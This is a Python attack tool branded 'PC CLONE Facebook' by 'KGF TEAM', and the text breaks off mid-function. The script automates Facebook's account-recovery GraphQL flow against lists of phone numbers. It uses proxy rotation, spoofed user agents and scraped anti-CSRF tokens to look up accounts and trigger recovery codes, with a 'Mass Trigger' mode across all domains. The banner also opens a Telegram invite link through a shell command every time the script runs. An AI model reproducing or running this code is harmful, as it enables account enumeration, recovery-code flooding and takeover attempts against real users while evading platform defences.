#____ DAVLOPER : KALYAN KING 
import os
import sys
import re
import json
import random
import asyncio
import hashlib
import getpass
import platform
import datetime
import uuid
import time
import webbrowser
from urllib.parse import urlencode, unquote

try:
    from curl_cffi.requests import AsyncSession
    import phonenumbers
    from colorama import init, Fore, Style
    import requests
except ImportError:
    print("Please install requirements first: pip install curl_cffi phonenumbers colorama requests")
    sys.exit(1)

init(autoreset=True)

#  ADMIN CONFIGURATION 

def get_file_path(filename):
    if "com.termux" in os.environ.get("PREFIX", "") or os.path.exists("/sdcard/"):
        return f"/sdcard/{filename}"
    return filename

NUMBERS_FILE = get_file_path("numbers.txt")
PROXY_FILE = get_file_path("proxy.txt")

#  TERMINAL COLORS 
C_GREEN = Fore.LIGHTGREEN_EX
C_WHITE = Fore.LIGHTWHITE_EX
C_RED = Fore.LIGHTRED_EX
C_YELLOW = Fore.LIGHTYELLOW_EX
C_CYAN = Fore.LIGHTCYAN_EX
C_MAGENTA = Fore.LIGHTMAGENTA_EX
C_RESET = Style.RESET_ALL

#  FB GRAPHQL DOC IDS 
FB_DOC_INITIATE = "34997761669869656"
FB_DOC_SEND_CODE = "9703687583048540"

def get_mac_safari():
    return "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15"

IOS_NEW_VERSIONS = [
    ('18_0', '605.1.15', '18.0', '22A3354'),
    ('18_0_1', '605.1.15', '18.0', '22A3370'),
    ('18_1', '605.1.15', '18.1', '22B83'),
    ('18_1_1', '605.1.15', '22B91'),
    ('18_2', '605.1.15', '18.2', '22C152'),
    ('18_2_1', '605.1.15', '18.2', '22C161'),
    ('18_3', '605.1.15', '18.3', '22D60'),
    ('18_3_1', '605.1.15', '18.3', '22D63'),
    ('18_3_2', '605.1.15', '18.3', '22D82'),
    ('18_4', '605.1.15', '18.4', '22E240'),
    ('18_4_1', '605.1.15', '18.4', '22E252'),
    ('18_5', '605.1.15', '18.5', '22F76'),
]

def get_ios_new():
    ios_ver, webkit, safari_ver, build = random.choice(IOS_NEW_VERSIONS)
    return f'Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/{webkit} (KHTML, like Gecko) Version/{safari_ver} Mobile/{build} Safari/{webkit.split(".")[0]}.1'

WINDOWS_CHROME_VERSIONS = ["148.0.0.0", "149.0.0.0", "150.0.0.0", "151.0.0.0", "152.0.0.0"]

def get_windows_chrome():
    ver = random.choice(WINDOWS_CHROME_VERSIONS)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver} Safari/537.36"

MAC_CHROME_VERSIONS = ["148.0.0.0", "149.0.0.0", "150.0.0.0", "151.0.0.0", "152.0.0.0"]

def get_mac_chrome():
    ver = random.choice(MAC_CHROME_VERSIONS)
    return f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver} Safari/537.36"

EDGE_VERSIONS = ["148.0.0.0", "149.0.0.0", "150.0.0.0", "151.0.0.0", "152.0.0.0"]

def get_windows_edge():
    ver = random.choice(EDGE_VERSIONS)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver} Safari/537.36 Edg/{ver}"

LINUX_CHROME_VERSIONS = ["148.0.0.0", "149.0.0.0", "150.0.0.0", "151.0.0.0", "152.0.0.0"]

def get_linux_chrome():
    ver = random.choice(LINUX_CHROME_VERSIONS)
    return f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver} Safari/537.36"

IPAD_VERSIONS = [('18_3', '605.1.15', '18.3'), ('18_4', '605.1.15', '18.4'), ('18_5', '605.1.15', '18.5')]

def get_ipad_safari():
    ios_ver, webkit, safari_ver = random.choice(IPAD_VERSIONS)
    return f"Mozilla/5.0 (iPad; CPU OS {ios_ver} like Mac OS X) AppleWebKit/{webkit} (KHTML, like Gecko) Version/{safari_ver} Mobile/15E148 Safari/604.1"

def rand_fb_ua():
    ua_funcs = [get_mac_safari, get_ios_new, get_windows_chrome, get_mac_chrome, get_windows_edge, get_linux_chrome, get_ipad_safari]
    return random.choice(ua_funcs)()

FB_DOMAINS = [
  {"name": " Random Rotate (Recommended)", "value": "random"},
  {"name": " Mass Trigger (All Domains at once)", "value": "all"},
  {"name": " English (www.facebook.com)", "value": "www.facebook.com"},
  {"name": " Spanish (es-es.facebook.com)", "value": "es-es.facebook.com"},
  {"name": " French (fr-fr.facebook.com)", "value": "fr-fr.facebook.com"},
  {"name": " German (de-de.facebook.com)", "value": "de-de.facebook.com"},
  {"name": " Portuguese (pt-br.facebook.com)", "value": "pt-br.facebook.com"},
  {"name": " Arabic (ar-ar.facebook.com)", "value": "ar-ar.facebook.com"},
  {"name": " Italian (it-it.facebook.com)", "value": "it-it.facebook.com"},
  {"name": " Turkish (tr-tr.facebook.com)", "value": "tr-tr.facebook.com"},
  {"name": " Russian (ru-ru.facebook.com)", "value": "ru-ru.facebook.com"},
  {"name": " Indonesian (id-id.facebook.com)", "value": "id-id.facebook.com"},
  {"name": " Hindi (hi-in.facebook.com)", "value": "hi-in.facebook.com"},
  {"name": " Japanese (ja-jp.facebook.com)", "value": "ja-jp.facebook.com"},
  {"name": " Korean (ko-kr.facebook.com)", "value": "ko-kr.facebook.com"},
  {"name": " Thai (th-th.facebook.com)", "value": "th-th.facebook.com"},
  {"name": " Vietnamese (vi-vn.facebook.com)", "value": "vi-vn.facebook.com"}
]

#  HELPERS 

def open_telegram_channel():
    tg_url = "https://t.me/+DzGy2e840RJiOGZl"
    try:
        if sys.platform.startswith("linux"):
            os.system(f"xdg-open {tg_url} > /dev/null 2>&1")
        else:
            webbrowser.open(tg_url)
    except Exception:
        pass

def get_sec_headers(ua):
    headers = {}
    if ("Macintosh" in ua or "iPhone" in ua or "iPad" in ua) and "Version/" in ua:
        pass
    elif "Edg/" in ua:
        m = re.search(r"Edg/(\d+)\.", ua)
        edge_ver = m.group(1) if m else "124"
        headers["Sec-CH-UA"] = f'"Chromium";v="{edge_ver}", "Microsoft Edge";v="{edge_ver}", "Not-A.Brand";v="99"'
        headers["Sec-CH-UA-Mobile"] = "?0"
        headers["Sec-CH-UA-Platform"] = '"Windows"'
        headers["Sec-CH-UA-Platform-Version"] = '"10.0.0"'
        headers["Sec-CH-UA-Model"] = '""'
        headers["Sec-CH-Prefers-Color-Scheme"] = "dark"
    elif "Chrome" in ua:
        m = re.search(r"Chrome/(\d+)\.", ua)
        chrome_ver = m.group(1) if m else "124"
        headers["Sec-CH-UA"] = f'"Chromium";v="{chrome_ver}", "Google Chrome";v="{chrome_ver}", "Not-A.Brand";v="99"'
        headers["Sec-CH-UA-Mobile"] = "?0"
        if "Windows" in ua:
            headers["Sec-CH-UA-Platform"] = '"Windows"'
            headers["Sec-CH-UA-Platform-Version"] = '"10.0.0"'
        elif "Macintosh" in ua:
            headers["Sec-CH-UA-Platform"] = '"macOS"'
            headers["Sec-CH-UA-Platform-Version"] = '"14.0.0"'
        elif "Linux" in ua:
            headers["Sec-CH-UA-Platform"] = '"Linux"'
            headers["Sec-CH-UA-Platform-Version"] = '""'
        headers["Sec-CH-UA-Model"] = '""'
        headers["Sec-CH-Prefers-Color-Scheme"] = "dark"
    return headers

def load_lines(filename):
    if not os.path.exists(filename):
        return []
    with open(filename, "r", encoding="utf-8") as f:
        return [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]

def load_proxies():
    lines = load_lines(PROXY_FILE)
    proxies = []
    for line in lines:
        p = line.split(":")
        country = "RAW"
        proxy_url = ""
        if len(p) == 4:
            host, port, user, pwd = p
            proxy_url = f"http://{user}:{pwd}@{host}:{port}"
            m = re.search(r"(?:_custom_zone_|-region-|-country-)([A-Za-z]{2})", user, re.IGNORECASE)
            if m:
                country = m.group(1).upper()
        elif len(p) == 2:
            proxy_url = f"http://{p[0]}:{p[1]}"
        else:
            continue
        proxies.append({"proxyUrl": proxy_url, "country": country})
    return proxies

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_hwid():
    username = getpass.getuser() or "user"
    hostname = platform.node() or "host"
    os_name = platform.system()
    arch = platform.machine()
    raw = f"{username}_{hostname}_{os_name}_{arch}"
    return hashlib.md5(raw.encode()).hexdigest().upper()[:16]

def banner():
    clear_screen()
    os.system("xdg-open https://t.me/+DzGy2e840RJiOGZl ")
    kgf_banner = f"""{C_RED}
KKKKKKKKK    KKKKKKK       GGGGGGGGGGGGGFFFFFFFFFFFFFFFFFFFFFF
K:::::::K    K:::::K    GGG::::::::::::GF::::::::::::::::::::F
K:::::::K    K:::::K  GG:::::::::::::::GF::::::::::::::::::::F
K:::::::K   K::::::K G:::::GGGGGGGG::::GFF::::::FFFFFFFFF::::F
KK::::::K  K:::::KKKG:::::G       GGGGGG  F:::::F       FFFFFF
  K:::::K K:::::K  G:::::G                F:::::F             
  K::::::K:::::K   G:::::G                F::::::FFFFFFFFFF   
  K:::::::::::K    G:::::G    GGGGGGGGGG  F:::::::::::::::F   
  K:::::::::::K    G:::::G    G::::::::G  F:::::::::::::::F   
  K::::::K:::::K   G:::::G    GGGGG::::G  F::::::FFFFFFFFFF   
  K:::::K K:::::K  G:::::G        G::::G  F:::::F             
KK::::::K  K:::::KKKG:::::G       G::::G  F:::::F             
K:::::::K   K::::::K G:::::GGGGGGGG::::GFF:::::::FF           
K:::::::K    K:::::K  GG:::::::::::::::GF::::::::FF           
K:::::::K    K:::::K    GGG::::::GGG:::GF::::::::FF           
KKKKKKKKK    KKKKKKK       GGGGGG   GGGGFFFFFFFFFFF           
{C_CYAN}==============================================================
{C_YELLOW} Developer : KALYAN KING
 Telegram  : KGF TEAM
 TOOL : PC CLONE Facebook VS : 0.1
{C_CYAN}=============================================================={C_RESET}
"""
    print(kgf_banner)
    try:
        hwid = get_hwid()
        print(f"{C_GREEN}[*] Your Device HWID: {C_YELLOW}{hwid}{C_RESET}\n")
    except Exception:
        pass

#  PROXY HEALTH CHECK 
async def check_proxy(proxy):
    try:
        session_kwargs = {
            'proxies': {"http": proxy["proxyUrl"], "https": proxy["proxyUrl"]},
            'timeout': 20,
            'impersonate': 'chrome124'
        }
        async with AsyncSession(**session_kwargs) as session:
            resp = await session.get("https://www.facebook.com/favicon.ico", allow_redirects=False)
            return resp.status_code in [200, 301, 302, 303, 307, 308, 404]
    except Exception:
        return False

async def filter_live_proxies(proxies, threads=50):
    if not proxies:
        return []
    print(f"\n{C_CYAN} [*] Checking {len(proxies)} proxies ({threads} threads)...{C_RESET}")
    live = []
    dead = []
    done = 0
    total = len(proxies)
    sem = asyncio.Semaphore(threads)

    async def worker(proxy):
        nonlocal done
        async with sem:
            ok = await check_proxy(proxy)
            done += 1
            if ok:
                live.append(proxy)
                print(f"  {C_GREEN}[{done}/{total}] {proxy['country']} -> LIVE{C_RESET}")
            else:
                dead.append(proxy)
                print(f"  {C_RED}[{done}/{total}] {proxy['country']} -> DEAD{C_RESET}")

    tasks = [asyncio.create_task(worker(p)) for p in proxies]
    await asyncio.gather(*tasks)
    print(f"{C_GREEN} Result: {len(live)} LIVE | {len(dead)} DEAD{C_RESET}\n")
    return live

def detect_locale(phone):
    clean = phone.lstrip('+')
    cc2 = "US"
    calling_code = "1"
    try:
        pn = phonenumbers.parse("+" + clean)
        cc2 = phonenumbers.region_code_for_number(pn) or "US"
        calling_code = str(pn.country_code)
    except Exception:
        pass

    lang_map = {
        "US": "en", "GB": "en", "ES": "es", "FR": "fr", "DE": "de",
        "BR": "pt", "PT": "pt", "SA": "ar", "IT": "it", "TR": "tr",
        "RU": "ru", "ID": "id", "IN": "hi", "JP": "ja", "KR": "ko",
        "TH": "th", "VN": "vi", "CN": "zh", "BD": "bn"
    }
    lang = lang_map.get(cc2, "en")
    locale_str = f"{lang}_{cc2}"
    lang_header = f"{lang}-{cc2},{lang};q=0.9,en-US;q=0.8,en;q=0.7"
    if lang == "ar" and cc2 == "SA":
        lang_header = "ar-SA,ar;q=0.9,en;q=0.8"
        
    return {"clean": clean, "cc": calling_code, "locale": locale_str, "lang": lang_header, "countryCode2": cc2}

def get_lang_from_domain(fb_domain):
    if fb_domain.startswith("www.") or fb_domain.startswith("m."):
        return "en-US,en;q=0.9"
    subdomain = fb_domain.split(".")[0]
    if "-" in subdomain:
        lang, region = subdomain.split("-", 1)
        return f"{lang}-{region.upper()},{lang};q=0.9,en-US;q=0.8,en;q=0.7"
    return "en-US,en;q=0.9"

def get_locale_from_domain(fb_domain):
    if fb_domain.startswith("www.") or fb_domain.startswith("m."):
        return "en_US"
    subdomain = fb_domain.split(".")[0]
    if "-" in subdomain:
        lang, region = subdomain.split("-", 1)
        return f"{lang}_{region.upper()}"
    return "en_US"

def cipher_from_url(url):
    m = re.search(r'[?&](?:n|cipher|ci|ldata)=([^&\s#]{20,})', url)
    return unquote(m.group(1)) if m else None

def cipher_from_html(html):
    if not html: return None
    pats = [
        r'name=["\'](?:n|cipher|ci|ldata)["\'][^>]*value=["\']([A-Za-z0-9_\-]{20,})["\']',
        r'value=["\']([A-Za-z0-9_\-]{20,})["\'][^>]*name=["\'](?:n|cipher|ci|ldata)["\']',
        r'"(?:cipher|n|ci|ldata)"\s*:\s*"(A[d|X][A-Za-z0-9_\-]{20,})"',
        r'\\"(?:cipher|n|ci|ldata)\\":\s*\\"(A[d|X][A-Za-z0-9_\-]{20,})\\"',
        r'[?&](?:n|cipher|ci|ldata)=(A[d|X][A-Za-z0-9_\-]{20,})'
    ]
    for p in pats:
        m = re.search(p, html)
        if m: return unquote(m.group(1))
    return None

def parse_fb_json(raw):
    if isinstance(raw, dict): return raw
    s = str(raw)
    if s.startswith("for (;;);"): s = s[9:]
    try:
        return json.loads(s)
    except Exception:
        return {}

async def walk_redirects(session, first_resp, base_hdrs, fb_domain="www.facebook.com", max_hops=7):
    resp = first_resp
    html = ""
    for _ in range(max_hops):
        loc = resp.headers.get("location", "")
        if not loc:
            return {"cipher": cipher_from_html(resp.text), "html": resp.text, "finalUrl": ""}
        
        full_loc = loc if loc.startswith("http") else f"https://{fb_domain}{loc}"
        c = cipher_from_url(full_loc)
        if c: return {"cipher": c, "html": "", "finalUrl": full_loc}
        
        try:
            resp = await session.get(full_loc, headers=base_hdrs, allow_redirects=False)
        except Exception:
            return {"cipher": None, "html": "", "finalUrl": full_loc}
            
        html = resp.text
        c2 = cipher_from_html(html)
        if c2: return {"cipher": c2, "html": html, "finalUrl": full_loc}
        
        if resp.status_code not in [301, 302, 303, 307, 308]:
            return {"cipher": None, "html": html, "finalUrl": full_loc}
            
    return {"cipher": None, "html": html, "finalUrl": ""}

async def fb_get_page(session, phone, ua, fb_domain="www.facebook.com"):
    lang = get_lang_from_domain(fb_domain)
    locale_str = get_locale_from_domain(fb_domain)
    hdrs = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": lang,
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1"
    }
    hdrs.update(get_sec_headers(ua))
    
    try:
        resp = await session.get(f"https://{fb_domain}/login/identify/?ctx=recover&locale={locale_str}", headers=hdrs, allow_redirects=True)
    except Exception as e:
        return {"ok": False, "error": str(e)}
        
    html = resp.text
    
    def re_search(pat, def_val=""):
        m = re.search(pat, html)
        return m.group(1) if m else def_val
        
    lsd = (re_search(r'"LSD",\s*\[\],\s*\{"token":"([^"]+)"') or 
           re_search(r'name="lsd"\s+value="([^"]+)"') or 
           re_search(r'\["LSD",[^\]]*\],\{"token":"([^"]+)"'))
           
    if not lsd: return {"ok": False, "error": f"No LSD. HTTP {resp.status_code}"}
    
    jaz = "2" + str(sum(ord(c) for c in lsd))
    
    params = {
        "fb_dtsg": re_search(r'"DTSGInitialData",\s*\[\],\s*\{"token":"([^"]+)"') or re_search(r'"DTSGInitialData",\[\],\{"token":"([^"]+)"\}'),
        "__rev": re_search(r'"client_revision":(\d+)'),
        "__hs": re_search(r'"haste_session":"([^"]+)"'),
        "__hsi": re_search(r'"hsi":"([^"]+)"'),
        "__spin_r": re_search(r'"__spin_r":(\d+)'),
        "__spin_b": re_search(r'"__spin_b":"([^"]+)"', "trunk"),
        "__spin_t": re_search(r'"__spin_t":(\d+)'),
        "__dyn": re_search(r'"__dyn":"([^"]+)"'),
        "__csr": re_search(r'"__csr":"([^"]+)"'),
        "__hsdp": re_search(r'"__hsdp":"([^"]+)"'),
        "__hblp": re_search(r'"__hblp":"([^"]+)"'),
        "__sjsp": re_search(r'"__sjsp":"([^"]+)"'),
        "__s": re_search(r'"__s":"([^"]+)"'),
        "jazoest": jaz,
        "cipher_text": cipher_from_html(html)
    }
    
    return {"ok": True, "lsd": lsd, "params": params}

async def fb_submit_phone(session, phone, waterfall_id, lsd, params, ua, fb_domain="www.facebook.com"):
    lang = get_lang_from_domain(fb_domain)
    hdrs = {
        "User-Agent": ua,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": lang,
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": f"https://{fb_domain}/login/identify/",
        "Origin": f"https://{fb_domain}",
        "Upgrade-Insecure-Requests": "1",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "Connection": "keep-alive"
    }
    hdrs.update(get_sec_headers(ua))
    
    variants = [f"+{phone.lstrip('+')}", phone.lstrip('+')]
    last_err = "no attempt"
    
    for phone_fmt in variants:
        q_vars = json.dumps({
            "params": {
                "cipher_text": params.get("cipher_text"),
                "context": "recover",
                "event_request_id": str(uuid.uuid4()),
                "friend_name": "",
                "search_query": phone_fmt,
                "waterfall_id": waterfall_id
            }
        })
        
        base_body = {
            "av": "0", "__aaid": "0", "__user": "0", "__a": "1", "__req": "5", "__comet_req": "15",
            "locale": get_locale_from_domain(fb_domain),
            "__hs": params.get("__hs",""), "__hsi": params.get("__hsi",""), "__rev": params.get("__rev",""),
            "__spin_r": params.get("__spin_r",""), "__spin_b": params.get("__spin_b","trunk"), "__spin_t": params.get("__spin_t",""),
            "__dyn": params.get("__dyn",""), "__csr": params.get("__csr",""), "__hsdp": params.get("__hsdp",""),
            "__hblp": params.get("__hblp",""), "__sjsp": params.get("__sjsp",""),
            "__ccg": "GOOD", "dpr": "1",
            "lsd": lsd, "jazoest": params.get("jazoest",""),
            "__crn": "comet.fbweb.CometCAAAccountSearchRoute",
            "qpl_active_flow_ids": "516759801",
            "fb_api_caller_class": "RelayModern",
            "fb_api_req_friendly_name": "CAAFBAccountSearchViewQuery",
            "server_timestamps": "true",
            "variables": q_vars,
            "doc_id": "27012969198380071",
            "fb_api_analytics_tags": '["qpl_active_flow_ids=516759801"]'
        }
        if params.get("__s"): base_body["__s"] = params["__s"]
        if params.get("fb_dtsg"): base_body["fb_dtsg"] = params["fb_dtsg"]
        
        try:
            resp = await session.post(
                f"https://{fb_domain}/api/graphql/",
                data=base_body,
                headers={
                    "User-Agent": ua,
                    "Accept": "*/*",
                    "Accept-Language": lang,
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": f"https://{fb_domain}",
                    "Referer": f"https://{fb_domain}/login/identify/?ctx=recover",
                    "X-ASBD-ID": "359341",
                    "X-FB-Friendly-Name": "CAAFBAccountSearchViewQuery",
                    "X-FB-LSD": lsd,
                    **get_sec_headers(ua)
                },
                allow_redirects=False
            )
        except Exception as e:
            last_err = str(e)
            continue
            
        loc0 = resp.headers.get("location", "")
        html = resp.text
        data_obj = parse_fb_json(html.split("\n")[0]) if html else {}
        
        cipher = cipher_from_url(loc0)
        if cipher: return {"cipher": cipher, "error": None}
        
        if resp.status_code in [301, 302, 303, 307, 308]:
            res = await walk_redirects(session, resp, hdrs, fb_domain)
            if res["cipher"]: return {"cipher": res["cipher"], "error": None}
            c3 = cipher_from_html(res["html"])
            if c3: return {"cipher": c3, "error": None}
            
        cipher = cipher_from_html(html)
        if cipher: return {"cipher": cipher, "error": None}
        
        search_res = data_obj.get("data", {}).get("caa_ar_fb_account_search", {})
        if search_res:
            if search_res.get("redirect_uri"):
                m = re.search(r'[?&](?:cipher|ci)=([^&]+)', search_res["redirect_uri"])
                if m: return {"cipher": unquote(m.group(1)), "error": None}
            if search_res.get("error_content"):
                err_desc = search_res["error_content"].get("description") or search_res["error_content"].get("title") or "No account found"
                return {"cipher": None, "noAccount": True, "error": err_desc}
            if search_res.get("num_results_shown") == 0:
                return {"cipher": None, "noAccount": True, "error": "num_results_shown is 0"}
                
        if any(x in html for x in ["account_recovery.account_search", "account_search_body", 'name="email"', "Find Your Account"]):
            return {"cipher": None, "noAccount": True, "error": "No account found for this number"}
            
        last_err = f"Status:{resp.status_code} Loc='{loc0[:60]}' HTML[0:400]='{html[:400].replace(chr(10), ' ')}'"
        
    return {"cipher": None, "noAccount": False, "error": last_err}

async def fb_initiate_view(session, phone, cipher, lsd, params, ua, fb_domain="www.facebook.com"):
    lang = get_lang_from_domain(fb_domain)
    q_vars = json.dumps({"params": {"cipher": cipher}})
    base_body = {
        "av": "0", "__aaid": "0", "__user": "0", "__a": "1", "__req": "7", "__comet_req": "15",
        "locale": get_locale_from_domain(fb_domain),
        "__hs": params.get("__hs",""), "__hsi": params.get("__hsi",""), "__rev": params.get("__rev",""),
        "__spin_r": params.get("__spin_r",""), "__spin_b": params.get("__spin_b","trunk"), "__spin_t": params.get("__spin_t",""),
        "__dyn": params.get("__dyn",""), "__csr": params.get("__csr",""), "__hsdp": params.get("__hsdp",""),
        "__hblp": params.get("__hblp",""), "__sjsp": params.get("__sjsp",""),
        "__ccg": "GOOD", "dpr": "1",
        "lsd": lsd, "jazoest": params.get("jazoest",""),
        "__crn": "comet.fbweb.CometCAAARInitiateViewRoute",
        "qpl_active_flow_ids": "516759801",
        "fb_api_caller_class": "RelayModern",
        "fb_api_req_friendly_name": "CAAFBARInitiateViewPushableQuery",
        "server_timestamps": "true",
        "variables": q_vars,
        "doc_id": FB_DOC_INITIATE,
        "fb_api_analytics_tags": '["qpl_active_flow_ids=516759801"]'
    }
    if params.get("__s"): base_body["__s"] = params["__s"]
    if params.get("fb_dtsg"): base_body["fb_dtsg"] = params["fb_dtsg"]
    
    hdrs = {
        "User-Agent": ua,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Accept-Language": lang,
        "Referer": f"https://{fb_domain}/login/identify/",
        "Origin": f"https://{fb_domain}",
        "X-FB-LSD": lsd, "X-ASBD-ID": "359341",
        "X-FB-Friendly-Name": "CAAFBARInitiateViewPushableQuery",
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin"
    }
    hdrs.update(get_sec_headers(ua))
    
    try:
        resp = await session.post(f"https://{fb_domain}/api/graphql/", data=base_body, headers=hdrs, allow_redirects=False)
        data = parse_fb_json(resp.text)
        view = data.get("data", {}).get("caa_ar_fb_initiate_view", {})
        if not view or not view.get("cipher"):
            err_msg = data.get("errors", [{}])[0].get("message", "null view")
            return {"ok": False, "error": f"FB: {err_msg} | {resp.text[:200]}"}
        return {"ok": True, "cipher": view.get("cipher"), "cuid": view.get("cuid", ""), "cpOpts": view.get("contactpoint_options", [])}
    except Exception as e:
        return {"ok": False, "error": str(e)}

async def fb_support_chat(session, phone, cipher, cuid, lsd, params, ua, fb_domain="www.facebook.com"):
    lang = get_lang_from_domain(fb_domain)
    variables = json.dumps({"request": {"cipher": cipher, "cuid": cuid, "existing_token": None}})
    base_body = {
        "av": "0", "__aaid": "0", "__user": "0", "__a": "1", "__req": "b", "__comet_req": "15",
        "locale": get_locale_from_domain(fb_domain),
        "__hs": params.get("__hs",""), "__hsi": params.get("__hsi",""), "__rev": params.get("__rev",""),
        "__spin_r": params.get("__spin_r",""), "__spin_b": params.get("__spin_b","trunk"), "__spin_t": params.get("__spin_t",""),
        "__dyn": params.get("__dyn",""), "__csr": params.get("__csr",""), "__hsdp": params.get("__hsdp",""),
        "__hblp": params.get("__hblp",""), "__sjsp": params.get("__sjsp",""),
        "__ccg": "GOOD", "dpr": "1",
        "lsd": lsd, "jazoest": params.get("jazoest",""),
        "__crn": "comet.fbweb.CometCAAARCodeEntryRoute",
        "qpl_active_flow_ids": "516759801",
        "fb_api_caller_class": "RelayModern",
        "fb_api_req_friendly_name": "ConversationalSupportFBFPChatExperienceQuery",
        "server_timestamps": "true",
        "variables": variables,
        "doc_id": "27102018216149070",
        "fb_api_analytics_tags": '["qpl_active_flow_ids=516759801"]'
    }
    if params.get("__s"): base_body["__s"] = params["__s"]
    if params.get("fb_dtsg"): base_body["fb_dtsg"] = params["fb_dtsg"]
    
    hdrs = {
        "User-Agent": ua,
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Accept-Language": lang,
        "Referer": f"https://{fb_domain}/recover/code/?ci={cipher}",
        "Origin": f"https://{fb_domain}",
        "X-FB-LSD": lsd, "X-ASBD-ID": "359341",
        "X-FB-Friendly-Name": "ConversationalSupportFBFPChatExperienceQuery",
        "X-BH-FlowSessionID": params.get("flow_session_id", f"upl_wizard_{int(time.time()*1000)}_{uuid.uuid4()}"),
        "X-FB-UPL-SessionID": params.get("upl_session_id", f"upl_{int(time.time()*1000)}_{uuid.uuid4()}"),
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin"
    }
    hdrs.update(get_sec_headers(ua))
    
    try:
        await session.post(f"https://{fb_domain}/api/graphql/", data=base_body, headers=hdrs, allow_redirects=False)
    except Exception:
        pass

async def fb_send_code(session, phone, waterfall_id, cipher, cuid, cpKey, lsd, params, ua, fb_domain="www.facebook.com", lang_override=None):
    lang = lang_override or get_lang_from_domain(fb_domain)
    possible_docs = [
        {"id": "25714184854871712", "name": "useCAASendRecoveryCodeMutation", "type": "input"},
        {"id": "26721695507419072", "name": "useCAACodeResendMutation", "type": "input"},
        {"id": FB_DOC_SEND_CODE, "name": "CAAFBARSendCodeMutation", "type": "params"},
        {"id": "5604113339665511", "name": "CAAFBARSendCodeMutation", "type": "params"}
    ]
    
    for doc in possible_docs:
        doc_id = doc["id"]
        friendly_name = doc["name"]
        uid = str(uuid.uuid4())
        
        variables = ""
        crn = "comet.fbweb.CometCAAARInitiateViewRoute"
        ref_path = f"/recover/initiate/?ci={cipher}"
        
        if friendly_name == "useCAACodeResendMutation":
            variables = json.dumps({"input": {"actor_id": "0", "client_mutation_id": "2", "access_flow_version": "pre_mt_behavior", "cipher": cipher, "waterfall_id": waterfall_id}, "scale": 1})
            crn = "comet.fbweb.CometCAAARCodeEntryRoute"
            ref_path = f"/recover/code/?ci={cipher}"
        elif friendly_name == "useCAASendRecoveryCodeMutation":
            variables = json.dumps({"input": {"actor_id": "0", "client_mutation_id": "1", "access_flow_version": "pre_mt_behavior", "cipher": cipher, "event_request_id": uid, "recover_method": cpKey, "waterfall_id": waterfall_id}, "scale": 1})
        elif doc["type"] == "input":
            variables = json.dumps({"input": {"actor_id": "0", "client_mutation_id": "1", "access_flow_version": "pre_mt_behavior", "cipher": cipher, "event_request_id": uid, "recover_method": cpKey, "waterfall_id": waterfall_id}, "scale": 1})
        else:
            variables = json.dumps({"params": {"cipher": cipher, "contact_point": cpKey, "recover_method": cpKey, "event_request_id": uid, "waterfall_id": waterfall_id, "access_flow_version": "pre_mt_behavior"}})
            
        base_body = {
            "av": "0", "__aaid": "0", "__user": "0", "__a": "1", "__req": "8", "__comet_req": "15",
            "locale": get_locale_from_domain(fb_domain),
            "__hs": params.get("__hs",""), "__hsi": params.get("__hsi",""), "__rev": params.get("__rev",""),
            "__spin_r": params.get("__spin_r",""), "__spin_b": params.get("__spin_b","trunk"), "__spin_t": params.get("__spin_t",""),
            "__dyn": params.get("__dyn",""), "__csr": params.get("__csr",""), "__hsdp": params.get("__hsdp",""),
            "__hblp": params.get("__hblp",""), "__sjsp": params.get("__sjsp",""),
            "__ccg": "GOOD", "dpr": "1",
            "lsd": lsd, "jazoest": params.get("jazoest",""),
            "__crn": crn,
            "qpl_active_flow_ids": "516759801",
            "fb_api_caller_class": "RelayModern",
            "fb_api_req_friendly_name": friendly_name,
            "server_timestamps": "true",
            "variables": variables, "doc_id": doc_id,
            "fb_api_analytics_tags": '["qpl_active_flow_ids=516759801"]'
        }
        if params.get("__s"): base_body["__s"] = params["__s"]
        
        hdrs = {
            "User-Agent": ua,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": lang,
            "Referer": f"https://{fb_domain}{ref_path}",
            "Origin": f"https://{fb_domain}",
            "X-FB-LSD": lsd,
            "X-ASBD-ID": "359341",
            "X-FB-Friendly-Name": friendly_name,
            "X-BH-FlowSessionID": params.get("flow_session_id", f"upl_wizard_{int(time.time()*1000)}_{uuid.uuid4()}"),
            "X-FB-UPL-SessionID": params.get("upl_session_id", f"upl_{int(time.time()*1000)}_{uuid.uuid4()}"),
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin"
        }
        hdrs.update(get_sec_headers(ua))
        
        try:
